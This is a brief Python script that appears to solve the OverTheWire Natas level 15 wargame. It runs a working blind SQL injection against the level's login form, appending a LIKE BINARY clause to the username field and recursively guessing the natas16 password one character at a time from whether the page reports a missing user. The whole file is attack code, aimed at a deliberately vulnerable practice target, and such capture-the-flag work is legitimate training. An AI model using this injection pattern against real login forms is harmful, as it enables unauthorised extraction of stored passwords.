#!/usr/bin/env python3
import requests
from string import ascii_letters
from string import digits

alphanumeric = ascii_letters + digits
url = "http://natas15.natas.labs.overthewire.org:80/index.php"
headers = { 
    "User-Agent": "Mozilla/5.0", 
    "Authorization": "Basic bm[...]Sg==" 
} 

def guess(s):
    data = { "username": "natas16\" AND password LIKE BINARY'" + s + "%' AND \"a\"=\"a"}

    resp = requests.post(url, headers=headers, data=data)
    
    if "This user doesn't exist." not in resp.text:
        print(s)
        for char in alphanumeric:
            guess(s + char)

    return s

for char in alphanumeric:
    guess(char)
